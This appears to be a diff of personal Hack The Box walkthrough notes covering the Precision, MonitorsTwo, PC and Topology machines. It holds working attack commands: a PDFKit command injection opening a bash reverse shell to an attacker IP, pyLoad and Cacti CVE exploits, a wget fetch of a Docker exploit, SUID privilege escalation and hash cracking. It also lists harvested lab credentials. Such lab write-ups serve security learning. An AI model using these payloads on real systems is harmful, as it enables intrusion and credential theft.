@@ -1,78 +1,5 @@
 # HTB_Machines_Easy
 
-## Precision
-1. nmap -sC -sV 10.129.45.198
-
-    - 22/tcp open ssh (OpenSSH 8.4p1 Debian 5+deb11u1)
-        - ssh-hostkey = RSA/ECDSA/ED25519
-    - 80/tcp open http (nginx/1.18.0)
-        - http-title: Did not follow redirect to http://precious.htb/
-        
-   // we are able to connect remotely through SSH
-   // look like a web app, which we can display through HTTP in a browser
-   // Cant be reached by just IP address -> we need to configure redirect (DNS) at our local file /etc/hosts
-   
-   
-2. sudo nano /etc/hosts -> 10.129.45.198   precious.htb
-
-    - adding URL precious.htb as IP address of the host   
-    
-    
-3. Web App analysis
-    
-    - user inserts some web page URL, by submitting the Web App converts the given URL into PDF file
-    
-    
-    
-4. Crafting "command injection in pdf"
-
-    - https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795
-    - lets edit it for our case
-        - http://localhost/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.14.131/8000 0>&1"`'}
-            - https://www.revshells.com/
-                - nc -lvnp 8000
-                - sh -i >& /dev/tcp/10.10.14.131/8000 0>&1
-                    - IP address of VPN connection with HTB, not IP address of machine, we are willing to attack
-                    - port 8000     
-    
-5. nc -lvnp 8000
-    - listening all the communication at port number 8000
-    
-
-6. Launch Burpsuite+FoxyProxy
-
-
-7. http://localhost/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.14.131/8000 0>&1"`'}
-    - On the website precious.htb we enter the crafted command injection
-    - in the terminal under nc -lvnp 8000 we can see, that we are successfuly connected to the webserver
-    
-    
-8. Exploring the shell: ruby@precious:/var/www/pdfapp$
-    - ls
-    - cd ~/.bundle
-    - ls
-    - cat config
-        - BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
-            - credentials for SSH connection into targeted machine IP address
-                - UN: henry
-                - PW: Q3c1AqGHtoI0aXAYFH
-                
-                
-9. SSH connection into targeted machine IP address
-    - ssh henry@10.129.45.198       //IP address of the generated IP targeted machine
-        - PW: Q3c1AqGHtoI0aXAYFH
-    - ls
-    - cat user.txt
-        - USER FLAG: "XXXXX"
-        
-
-10. Hunting the root flag
-    - ln -s /root/root.txt dependencies.yml
-    - sudo /usr/bin/ruby /opt/update_dependencies.rb
-        - Even we get an error, it is enough for us :-) root flag is involved in the error message
-            - Traceback (most recent call last): /opt/update_dependencies.rb:20:in `<main>': undefined method `each' for "XXXXX":String (NoMethodError)
-    - ROOT FLAG: "XXXXX"
-
 ## MonitorsTwo
 1. Observe opened ports
     - `sudo nmap <ip>`
@@ -145,4 +72,165 @@ import socket,os,pty;s=socket.socket();s.connect(("10.10.14.12",1234));[os.dup2(
 
 ![](https://hackmd.io/_uploads/S13UdFU9h.png)
 
+## MonitorsTwo
+1. Reco
+    - `sudo nmap -sVC 10.10.11.211 -Pn`
+    - website on 10.10.11.211
+2. Weaponisation
+- running Cacti v1.2.22
+            - [VULN](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22)
+                - exploit allows through an RCE to obtain RS
+3. Exploitation
+- `nc -nlvp <port>`
+- `python3 CVE-2022-46169.py -u http://<MACHINE_IP> --LHOST=<LOCAL_IP> --LPORT=<PORT>`
+- we are inside www-data
+    - cd 
+    - ls -la 
+        - there is an "entrypoint.sh" file
+            - cat entrypoint.sh
+                ![](https://hackmd.io/_uploads/H1H3v98qh.png)
+                - MySQL credentials
+    - cd /var/www/html
+        - cat cacti.sql
+            - login credentials
+                ![](https://hackmd.io/_uploads/ryqNccI92.png)
 
+                - admin, guest
+                    - but not much helpful
+    - there is "linpeas.sh" file
+        - after run it shows that /sbin/capsh is vuln
+            - [VULN](https://gtfobins.github.io/gtfobins/capsh/#suid)
+                - go to the /sbin folder
+                    - `./capsh --gid=0 --uid=0 --`
+                    - `mysql — host-db — user=root cacti -e “SELECT * FROM user_auth”`
+                        - user marcus with hash PW
+                            - crack PW with john or hashcat
+                            - `hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt  --sho`
+                                - marcus:funkymonkey
+4. User flag
+    - ssh marcus@10.10.11.211
+        - PW: funkymonkey
+    ![](https://hackmd.io/_uploads/rylmhqIc3.png)
+5. Root flag
+    - cat /var/mail/marcus
+        - ![](https://hackmd.io/_uploads/SJ6faqIq2.png)
+    - Docker version
+        - ![](https://hackmd.io/_uploads/BJbh2qU92.png)
+        - [VULN](https://github.com/UncleJ4ck/CVE-2021-41091)
+    - upload the CVE exploit to the marcus ssh
+    - LOCAL machine:    
+        - git clone https://github.com/UncleJ4ck/CVE-2021-41091
+        - cd CVE-2021-41091
+        - chmod +x ./exp.sh
+        - python3 -m http.server 80
+    - marcus:
+        - wget http://<LOCAL_IP>/exp.sh
+    ![](https://hackmd.io/_uploads/BJxElo8q3.png)
+        - chmod +x exp.sh
+        - ./exp.sh
+            - yes
+        - cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+        - ./bin/bash -p
+            - NOTHING HAPPENS even after restarting machine
+                - cant obtain root flag...
+
+## PC
+1. Reco
+- `nmap -sVC 10.10.11.214 -Pn -p-`
+    - 22 SSH
+    - 50051 gRPC channel
+        - [TOOL](https://github.com/fullstorydev/grpcui)
+2. Weaponisation
+    - grpcui -plaintext 10.10.11.214:50051
+    - ![](https://hackmd.io/_uploads/HyzIFj8c3.png)
+        - admin:admin
+            - obtained token
+3. Exploitation
+        - run it in burpsuite
+            - save the request as "sqli.req"
+                - sqlmap -r sqli.req --dump
+                ![](https://hackmd.io/_uploads/SJH3ti853.png)
+                - admin:admin
+                - sau:HereIsYourPassWord1431
+4. User flag
+    - ssh sau@10.10.11.214
+        - PW: HereIsYourPassWord1431
+    - ls
+    - cat user.txt
+
+5. Root flag
+    - PE
+        - nothing useful using linpeas.sh
+            - cd 
+                - netstat -nltp
+            - BUT running port 8000, service pyLoad
+                - [VULN](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad)
+        - `ssh -L 8888:127.0.0.1:8000 sau@10.10.11.214`
+            - access URL: 127.0.0.1:8888
+                - ![](https://hackmd.io/_uploads/Hkva3iI9n.png)
+        - pyload --version
+            - pyLoad 0.5.0
+                - [CVE](https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/)
+>                     - curl -i -s -k -X $'POST' \
+>     -H $'Host: 127.0.0.1:8000' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 184' \
+>     --data-binary $'package=xxx&crypted=AAAA&jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%74%6f%75%63%68%20%2f%74%6d%70%2f%70%77%6e%64%22%29;f=function%20f2(){};&passwords=aaaa' \
+>     $'http://127.0.0.1:8000/flash/addcrypted2'
+- [Exploit Code](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad)
+    - edit it for our purpose
+curl -i -s -k -X $'POST' \
+    --data-binary $'jk=pyimport%20os;os.system(\"Bash%20/dev/shm/rev.sh\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
+    $'http://127.0.0.1:8000/flash/addcrypted2'
+- on SAU:
+    - cd /dev
+        - cd shm
+            - nano rev.sh
+                - ![](https://hackmd.io/_uploads/SkYEyhUc2.png)
+            - chmod +x rev.sh
+            - ./rev.sh
+            - ![](https://hackmd.io/_uploads/rylOE2Iq3.png)
+
+- on LOCAL machine:
+    - `nc -nlvp 4444`
+    - boom, we are in
+        - cd 
+        - cat root.txt
+
+## Topology
+1. Reco
+    - `nmap -sVC 10.10.11.217 -Pn -p-`
+        - 22 and 80 open
+    - website
+        - Gobuster found nothing
+        - there is a link to LaTex Equation Generator
+2. Weaponisation
+            - HTPASSWD exploit
+                - `$\lstinputlisting{/var/www/dev/.htpasswd}$`
+                - ![](https://hackmd.io/_uploads/rkeYInIq3.png)
+3. Exploitation
+    - we obtained login credentials with hashed PW
+        - hash-identifier -> md5
+            - decrypt it to obtain PW
+                - vdaisley@topology.htb:calculus20 
+4. User flag
+    - ssh vdaisley@10.10.11.217
+        - PW: calculus20
+    - ls
+    - cat user.txt
+
+5. Root flag
+    - while searching the dirs in user, there is gnuplot in /opt dir
+        - ![](https://hackmd.io/_uploads/rkJWO2Ucn.png)
+        - gnuplot uses plt files - we can use it for pspy86 exploitation
+            - lets create http server, upload a file containing exploit inside the machine to obtain root privileges
+    - LOCAL machine:
+        - download pspy64 exploit
+        - python -m http.server
+    - TARGET machine:
+        - wget <LOCAL_IP>:8000/pspy64
+        - echo "system "chmod u+s"" > /opt/gnuplot/test.plt
+        - cat /opt/gnuplot/test.plt
+        - ls -la /opt/gnuplot/test.plt
+        - bash -p
+        - whoami
+        - cd root
+            - cat root.txt
